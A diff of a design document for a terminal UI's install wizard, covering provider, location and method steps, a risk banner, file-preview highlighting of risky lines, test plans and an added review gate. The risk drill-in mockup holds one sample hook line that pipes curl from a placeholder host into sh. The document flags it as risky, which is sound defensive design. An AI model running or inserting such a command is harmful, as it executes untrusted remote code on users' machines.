@@ -7,7 +7,8 @@
 
 The TUI can browse and edit content but cannot add, install, remove, or manage it.
 This design covers every state-modifying action the TUI needs, organized into
-full-screen wizards, overlay modals, and simple actions.
+full-screen wizards (Add, Install), overlay modals (Confirm, Registry Add,
+Loadout Apply), and simple actions (Remove, Uninstall, Sync).
 
 ---
 
@@ -33,15 +34,16 @@ These rules apply to all wizard and modal implementations:
 Full-screen wizard models are stored as **pointer fields** on `App`:
 ```go
 type App struct {
-    wizardMode wizardKind         // 0=none, 1=add, 2=share
-    addWizard  *addWizardModel    // nil when not active
-    shareWiz   *shareWizardModel  // nil when not active
+    wizardMode    wizardKind            // 0=none, 1=add, 2=install, 3=share
+    addWizard     *addWizardModel       // nil when not active
+    installWizard *installWizardModel   // nil when not active
+    shareWiz      *shareWizardModel     // nil when not active
 }
 ```
 - Avoids expensive value copies of complex wizard state during BubbleTea's
   `Update()` → return cycle
 - Nil when inactive (zero cost)
-- Overlay modals (confirm, install, registry add, loadout apply) remain value
+- Overlay modals (confirm, registry add, loadout apply) remain value
   types since they are small
 
 ### Wizard Mode Early-Return Routing
@@ -295,10 +297,10 @@ this via `syllago share [--to <registry>]`.
 
 | Location     | `[a]` Add                 | `[i]` Install | `[x]` Uninstall   | `[d]` Remove   | `[s]` Share  | Other        |
 |--------------|---------------------------|---------------|-------------------|----------------|--------------|--------------|
-| Library      | Add wizard                | Install modal | Uninstall confirm | Remove confirm | Share wizard | —            |
-| Loadouts     | —                         | Apply modal   | —                 | Remove confirm | Share wizard | —            |
-| Registries   | Add registry              | —             | —                 | Remove confirm | —            | `[S]` Sync   |
-| Content tabs | Add wizard (pre-filtered) | Install modal | Uninstall confirm | Remove confirm | Share wizard | —            |
+| Library      | Add wizard                | Install wizard | Uninstall confirm | Remove confirm | Share wizard | —            |
+| Loadouts     | —                         | Apply modal    | —                 | Remove confirm | Share wizard | —            |
+| Registries   | Add registry              | —              | —                 | Remove confirm | —            | `[S]` Sync   |
+| Content tabs | Add wizard (pre-filtered) | Install wizard | Uninstall confirm | Remove confirm | Share wizard | —            |
 | Config       | Add Provider picker       | —             | —                 | Remove confirm | —            | `[u]` Update |
 
 ### Deferred Actions
@@ -438,70 +440,149 @@ items have been added:
 
 ---
 
-### W2: Install Modal (Overlay on Current Screen)
+### W2: Install Wizard (Full-Screen)
 
-**Purpose:** Activate a library item in a provider's location.
+**Purpose:** Activate a library item in a provider's location. Full-screen
+experience with step breadcrumbs, risk review with code highlighting, and
+drill-in to file previews.
 
 **Entry point:** `[i]` on a selected item in Library or Content tabs.
+
+**Why full-screen (not overlay modal):**
+- Provider list can be long (12+ providers today, growing)
+- Step breadcrumbs with clickable back-navigation need screen width
+- Risk review step requires drill-in to file previews with highlighted code
+- Consistent experience with Add Wizard (Phase D) — users learn one pattern
+- Reusable wizard shell and risk banner become shared infrastructure
 
 **validateStep() prerequisites:**
 
 | Step | Prerequisites (panic if violated) |
 |------|-----------------------------------|
-| installStepProvider | `item != nil` (item passed from caller) |
-| installStepLocation | `provider != ""` (provider selected or auto-skipped) |
-| installStepMethod | `location != ""` AND `item.Type != Hooks` AND `item.Type != MCP` |
-| installStepReview | `provider != ""` AND `location != ""` |
+| installStepProvider | `item.Path != ""` (item passed from caller) |
+| installStepLocation | `providerCursor` in range AND selected provider not already-installed |
+| installStepMethod | `locationCursor` valid AND `!isJSONMerge` |
+| installStepReview | provider selected AND (isJSONMerge OR location selected) |
 
 **Steps:**
 
 ```
-Step 1: Provider (skip if only one detected)
+╭──syllago─── Install ──────────────────────────────────╮
+│  [1 Provider]  [2 Location]  [3 Method]  [4 Review]  │
+╰───────────────────────────────────────────────────────╯
+
+Step 1: Provider (skip if only one detected + not installed)
   Install to which provider?
-  ( ) Claude Code    (detected)
-  ( ) Cursor         (detected)  [already installed]
-  ( ) Windsurf       (not detected)
+
+  > Claude Code         (detected)
+    Cursor              (already installed)
+    Gemini CLI          (detected)
+
+  [Cancel]  [Next]
 ```
+
+**Step breadcrumb bar** shows all steps. Completed steps are clickable to go
+back. Future steps are muted. Active step is highlighted. For hooks/MCP,
+steps 2-3 are omitted from the breadcrumb bar (only Provider and Review shown).
 
 **Provider picker shows install status:** If the selected content is already
-installed in a provider, that provider shows "(already installed)" and is
-disabled to prevent conflicts. This component is reused across all wizards
-with provider selection (add, install, loadout apply).
+installed in a provider, that provider shows "(already installed)" in muted
+text and is skipped during keyboard navigation. This provider picker component
+is reused across all wizards with provider selection (add, install, loadout apply).
 
 ```
-Step 2: Location
-  Install location:
-  ( ) Global    (~/.claude/rules/)
-  ( ) Project   (./.claude/rules/)
-  ( ) Custom    [text input for local directory path]
+Step 2: Location (skip for hooks/MCP)
+  Install location for Claude Code:
+
+  > Global   (~/.claude/rules/)
+    Project  (./.claude/rules/)
+    Custom   [________________________]
+
+  [Back]  [Next]
 ```
 
 Custom location accepts local directories only (remote locations deferred).
+When Custom is selected, the text input field activates with background
+tinting and a block cursor (same pattern as editModal fields).
 
 ```
 Step 3: Method (skip for hooks/MCP which always JSON-merge)
   Install method:
-  ( ) Symlink   (recommended — stays in sync with library)
-  ( ) Copy      (standalone copy, won't auto-update)
+
+  > Symlink   (recommended — stays in sync with library)
+    Copy      (standalone copy, won't auto-update)
+
+  [Back]  [Next]
 ```
+
+Symlink is disabled (muted + "(not supported)") when the provider explicitly
+marks the content type as not supporting symlinks via `SymlinkSupport`.
 
 ```
 Step 4: Review + Confirm
-  Installing "my-rule" to Claude Code:
+  Installing "my-rule" to Claude Code
 
-  Location: ~/.claude/rules/my-rule -> ~/.syllago/content/rules/my-rule
+  Location: ~/.claude/rules/my-rule
   Method:   Symlink
+  Source:   ~/.syllago/content/rules/my-rule
 
-  [Risk banner if applicable]
+  ╭─ Risk Indicators ──────────────────────────────╮
+  │  ! Bash access — content references Bash tool  │
+  ╰────────────────────────────────────────────────╯
 
-  [Enter] Install  [Esc] Cancel
+  [Cancel]  [Back]  [Install]
 ```
 
-**For Hooks/MCP:** Steps 2-3 are different:
+**Risk banner** shows risk indicators from `catalog.RiskIndicators()`. Items
+are navigable with Up/Down arrows. Enter drills into the file preview showing
+the risky code with highlighted lines (tinted background). Esc returns from
+drill-in to the review step.
+
+**Backend change required:** `catalog.RiskIndicator` needs a `Level` field
+(`RiskLevel` enum: `RiskHigh`, `RiskMedium`) and a `Lines` field
+(`[]RiskLine` with `File string` and `Line int`) to support severity-based
+border coloring and code highlighting. The risk scanner (`risk.go`) must be
+updated to populate these fields. For example, "Runs commands" is HIGH,
+"Environment variables" is MEDIUM.
+
+- Border color: RED when any HIGH risk, ORANGE for MEDIUM only
+- Empty risk list: no banner rendered (zero height)
+- Command previews truncated for long commands
+
+**For Hooks/MCP:** Steps 2-3 are skipped entirely:
+- Breadcrumb shows only: `[1 Provider]  [2 Review]`
 - No location choice (always merges into provider settings)
 - No method choice (always JSON merge)
 - Review shows: "Will merge into ~/.claude/settings.json"
-- Risk banner always shown with command details
+- Risk banner always shown with command details (hooks always have risks)
+
+**Risk drill-in view:**
+```
+╭──syllago─── Install > Review > risk-hook.json ────────╮
+│  [1 Provider]  [2 Review]                             │
+╰───────────────────────────────────────────────────────╯
+
+  1 │ {
+  2 │   "hooks": {
+  3 │     "PreToolUse": [
+  4 │       {
+  5 ▌         "command": "bash -c 'curl http://example.com | sh'"  ◄ risky
+  6 │       }
+  7 │     ]
+  8 │   }
+  9 │ }
+
+  [Esc] Back to review
+```
+
+Risky lines are highlighted with a tinted background (warm/danger color) and
+a marker in the gutter. This reuses the existing file preview component with
+an additional "highlight lines" capability.
+
+**Code highlighting implementation:** The risk scanner identifies line numbers
+where risky patterns occur (commands, URLs, env vars). The file preview
+component accepts an optional set of highlight line numbers and renders those
+lines with a tinted background style.
 
 ---
 
@@ -751,54 +832,74 @@ Target: **80% minimum per package, 95%+ aspirational** (consistent with project 
 - Uninstall confirm (80x30)
 - All at 60x20 minimum size
 
-### Phase B: Install Modal
+### Phase B: Install Wizard
 
-**Component tests (`install_modal_test.go`):**
-- Provider picker: shows detected providers
-- Provider picker: "already installed" disables provider, shows badge
+**Wizard shell tests (`wizard_shell_test.go`):**
+- Step bar renders correct count for 4 steps (Provider, Location, Method, Review)
+- Step bar renders 2 steps for hooks/MCP (Provider, Review)
+- Active step highlighted (bold + primary color)
+- Completed steps clickable (underlined)
+- Future steps muted and non-clickable
+- Click on completed step produces navigation message
+- Click on future step is no-op
+- State preserved when navigating back without changes
+
+**Install wizard tests (`install_test.go`):**
+- Provider picker: shows detected providers with status badges
+- Provider picker: "already installed" disables provider, navigation skips
 - Provider picker: single-provider auto-skips step
-- Location selection: global/project/custom
-- Custom path text input: typing, editing, space handling
-- Custom path: empty rejected, nonexistent warns
+- Provider picker: all providers installed — only Esc works
+- Location selection: global/project/custom with resolved paths
+- Custom path text input: typing, backspace, space, cursor movement
+- Custom path: empty rejected (Enter is no-op)
 - Method selection: symlink/copy, symlink disabled when unsupported
-- Hooks/MCP: location and method steps skipped (JSON merge shown)
+- Hooks/MCP: location and method steps skipped (JSON merge)
 - Review step: shows correct destination path (global symlink, project copy)
-- Review step: shows risk banner for hooks/MCP
-- Step transitions: forward, back, skip logic
+- Review step: shows risk indicators from catalog.RiskIndicators()
+- Review step: risk drill-in — Enter on risk item shows file preview
+- Review step: risk drill-in — risky lines highlighted with tinted background
+- Step transitions: forward, back, skip logic for all paths
 - Back from location to provider preserves selections
 - Back from method to location preserves selections
-- Esc exits modal from any step
+- Back from review risk drill-in returns to review
+- Esc exits wizard from provider step, backs out from other steps
 - Enter on review confirms and produces install message
 - Double-confirm prevention: Enter on review disabled after first press
-- Stale async result ignored after modal dismissal
-
-**Provider picker reuse tests (`provider_picker_test.go`):**
-- List rendering with status badges
-- Already-installed detection per content type
-- Provider detection status (detected vs not)
-- Keyboard navigation between providers
+- Stale async result ignored after wizard dismissal
 
 **Risk banner tests (`risk_banner_test.go`):**
-- Renders with HIGH/MEDIUM items
-- Border color: RED for any HIGH, ORANGE for MEDIUM only, RED for all HIGH
-- Navigation: arrows move between items, first auto-highlighted
-- Enter produces drill-in message for focused item
+- Renders with risk indicators from catalog.RiskIndicators()
+- Border color: RED for any HIGH risk, ORANGE for MEDIUM only
+- Navigation: Up/Down arrows move between risk items
+- Enter produces drill-in message for focused risk item
 - Single item: no arrow navigation needed
-- Empty list → no banner rendered (zero height)
+- Empty list: no banner rendered (zero height)
 - Command preview truncated for long commands
 
+**Risk code highlighting tests (`risk_highlight_test.go`):**
+- File preview with highlight lines shows tinted background on risky lines
+- Gutter marker on highlighted lines
+- Highlight lines from risk scanner match actual file content
+- No highlights when risk list is empty
+- Highlights work for JSON (hooks), YAML, and Markdown files
+
 **App integration tests:**
-- `[i]` on rule item → install modal opens
+- `[i]` on rule item → install wizard opens full-screen
 - `[i]` on hook item → skips location/method, shows JSON merge info
-- Full install flow: select provider → location → method → confirm → toast
+- `[i]` on non-library item → toast warning
+- `[i]` with no detected providers → toast warning
+- Full install flow: provider → location → method → confirm → toast + rescan
 - Install to already-installed provider → provider disabled in picker
-- Risk banner appears for hooks/MCP items
+- Risk banner appears for hooks/MCP items with drill-in working
+- Global keys (1/2/3, R, q) suppressed during wizard mode
+- Esc from provider step exits wizard, returns to previous view
 
 **Golden files:**
-- Install modal at each step (80x30, 60x20)
+- Install wizard at each step (80x30, 60x20)
 - Provider picker: mixed status (detected, installed, not detected)
-- Risk banner: HIGH items, MEDIUM only, all HIGH, mixed
-- Install modal for hooks (skipped steps, JSON merge info)
+- Risk banner: with indicators, empty state
+- Risk drill-in: file preview with highlighted risky lines
+- Install wizard for hooks (2-step breadcrumb, JSON merge review)
 
 ### Phase C: Registry Management
 
@@ -823,21 +924,9 @@ Target: **80% minimum per package, 95%+ aspirational** (consistent with project 
 
 ### Phase D: Add Wizard
 
-**Wizard shell tests (`wizard_shell_test.go`):**
-- Step bar renders correct count for 3, 5, and 7 steps
-- Active step highlighted (bold + primary color)
-- Completed steps clickable (underlined)
-- Future steps muted and non-clickable
-- Click on completed step produces navigation message
-- Click on future step is no-op
-- Step bar truncation at narrow widths (60 chars)
-- State preserved when navigating back without changes
-- State invalidated when step version changes (stepDirty mechanism)
-- Esc with no changes → exits immediately
-- Esc with changes → prompts unsaved-changes confirmation
-- Help bar shows step-specific hints per active step
-- Global keys (R, 1/2/3) suppressed during wizard mode
-- Golden: 5-step wizard at 80x30 and 60x20
+**Note:** Wizard shell tests are in Phase B (`wizard_shell_test.go`). Phase D
+reuses the wizard shell and risk banner built in Phase B. Only new Phase D
+components (checkbox list, add-specific flow) are tested here.
 
 **Checkbox list tests (`checkbox_list_test.go`):**
 - Space toggles item selection
@@ -956,7 +1045,7 @@ side effects. Backend operations are tested separately in their own packages:
 
 | TUI Test Verifies | Backend Test Verifies |
 |---|---|
-| Install modal → `doInstallMsg{provider, location, method}` | `installer` package → symlink/copy/merge |
+| Install wizard → `installResultMsg{provider, location, method}` | `installer` package → symlink/copy/merge |
 | Add wizard → `doAddMsg{items, source, options}` | `add` package → file writes + metadata |
 | Share wizard → `doShareMsg{item, destination}` | `promote` package → git branch + staging |
 | Remove confirm → `doRemoveMsg{item, providers}` | `remove` logic → uninstall + delete |
@@ -974,7 +1063,7 @@ Where `installed` maps item names to install status, avoiding filesystem checks.
 
 **New test helpers needed:**
 - `testConfirmModal(t)` — creates confirm modal with test data
-- `testInstallModal(t)` — creates install modal with provider stubs
+- `testInstallWizard(t)` — creates install wizard with provider stubs and test item
 - `testWizardShell(t, steps)` — creates wizard shell with given steps
 - `testCheckboxList(t, items)` — creates checkbox list with test items
 - `testRiskBanner(t, items)` — creates risk banner with test risk data
@@ -1006,10 +1095,28 @@ blockers are complete. This is enforced via bead dependencies.
    │  with Go Architecture Rules, all test cases have success criteria,
    │  validateStep prerequisites reflected, async safety patterns included.
    │  If issues found: fix the plan, re-run parity validation.
-   │  BLOCKING: the parity bead blocks the first implementation bead.
-   │  No implementation begins until parity is confirmed and the bead closed.
+   │  BLOCKING: the parity bead blocks the sanity check bead.
    │
-3. Sequential Task → Validate Chain
+3. Sanity Check Gate
+   │  A DIFFERENT sub-agent reviews the spec and implementation plan for:
+   │  (a) Clarity — instructions unambiguous enough for an impl agent?
+   │  (b) Security — injection vectors, path traversal, unsafe patterns?
+   │  (c) Go best practices — error handling, no panics in non-invariant
+   │      code, correct BubbleTea patterns (tea.Cmd for I/O, value types)?
+   │  (d) Glaring problems — missing edge cases, race conditions,
+   │      impossible states?
+   │  (e) Architectural fit — consistent with existing modal patterns
+   │      (remove.go, confirm.go, modal.go)?
+   │  (f) Test quality — planned tests exercise real behavior, not just
+   │      superficial assertions? No "tests that pass but prove nothing"
+   │      (e.g., checking a string isn't empty instead of checking it
+   │      contains the right value). Every test must justify its existence
+   │      by catching a real failure mode.
+   │  If issues found: fix the spec/plan, then re-run sanity check.
+   │  BLOCKING: the sanity check bead blocks the first implementation bead.
+   │  No implementation begins until sanity check passes and the bead closes.
+   │
+4. Sequential Task → Validate Chain
    │  Tasks execute one at a time in strict sequence:
    │    Impl Task A → Validate Task A → Impl Task B → Validate Task B → ...
    │
@@ -1022,7 +1129,7 @@ blockers are complete. This is enforced via bead dependencies.
    │  - If validation fails, fix the task before moving on.
    │  - The validation bead BLOCKS the next implementation bead.
    │
-4. Phase Validation
+5. Phase Validation
       Final bead blocked by the last per-task validation.
       Runs full test suite (make test), builds binary, smoke tests in
       real TUI. Confirms phase is complete and ready for next phase.
@@ -1033,13 +1140,14 @@ blockers are complete. This is enforced via bead dependencies.
 ```
 Plan (READY)
   └── Parity Check (blocked by plan)
-      └── Impl Task A (blocked by parity)
-          └── Validate Task A (blocked by impl A)
-              └── Impl Task B (blocked by validate A)
-                  └── Validate Task B (blocked by impl B)
-                      └── Impl Task C (blocked by validate B)
-                          └── Validate Task C (blocked by impl C)
-                              └── Phase Validation (blocked by last validate)
+      └── Sanity Check (blocked by parity)
+          └── Impl Task A (blocked by sanity check)
+              └── Validate Task A (blocked by impl A)
+                  └── Impl Task B (blocked by validate A)
+                      └── Validate Task B (blocked by impl B)
+                          └── Impl Task C (blocked by validate B)
+                              └── Validate Task C (blocked by impl C)
+                                  └── Phase Validation (blocked by last validate)
 ```
 
 **Why sequential, not parallel?** A validation failure on Task A may change the
@@ -1069,19 +1177,23 @@ reveal design changes.
 **Why first:** Simplest. Establishes modal overlay pattern for all future work.
 Enables destructive actions on existing content immediately.
 
-### Phase B: Install
+### Phase B: Install Wizard
 
-**Install modal with provider picker**
+**Full-screen install wizard with shared infrastructure**
 
+- Build wizard shell component (step breadcrumbs + back-navigation + state)
 - Build provider picker component with "already installed" detection (reusable)
-- Build install modal with provider/location/method steps
+- Build install wizard with provider/location/method/review steps
 - Support custom local directory paths
-- JSON merge path for hooks/MCP (skip method step)
-- Risk banner component (reused by all later wizards)
-- Wire `[i]` Install hotkey
+- JSON merge path for hooks/MCP (skip location + method steps)
+- Build risk banner component (reused by Add Wizard + Loadout Apply)
+- Build risk code highlighting for file preview (risky lines tinted)
+- Wire `[i]` Install hotkey + wizardMode routing
 
 **Why second:** Completes the "browse library → install to provider" loop.
-Users with content already in library can immediately use it.
+Users with content already in library can immediately use it. Also establishes
+the wizard shell, risk banner, and code highlighting as shared infrastructure
+that Phase D (Add Wizard) and Phase E (Loadout Apply) reuse directly.
 
 ### Phase C: Registry Management
 
@@ -1101,18 +1213,18 @@ Users with content already in library can immediately use it.
 - **Research spike:** Expand pattern-based code detection to cover all content
   types. Produce updated `risk.go` with comprehensive scanning before building
   the wizard UI.
-- Build wizard shell component (step breadcrumbs + back-navigation + state)
+- Reuse wizard shell component from Phase B (step breadcrumbs + back-navigation)
 - Build checkbox list component
-- Build navigable risk banner component
+- Reuse risk banner + code highlighting from Phase B
 - Implement all 5 steps: source → type → discovery → review → execute
 - Per-content-type discovery (provider scan, registry browse, local path, git)
 - Async discovery with spinner
 - Conflict detection and per-item overwrite toggle
 - Universal code scanning on all items
 
-**Why fourth:** The biggest piece. Depends on wizard shell, risk banner,
-and checkbox list — all new components. Benefits from registry add being
-available for registry-source imports.
+**Why fourth:** The biggest piece. Reuses wizard shell, risk banner, and code
+highlighting from Phase B. New components: checkbox list, async discovery.
+Benefits from registry add being available for registry-source imports.
 
 ### Phase E: Loadout Apply + Remove + Share
 
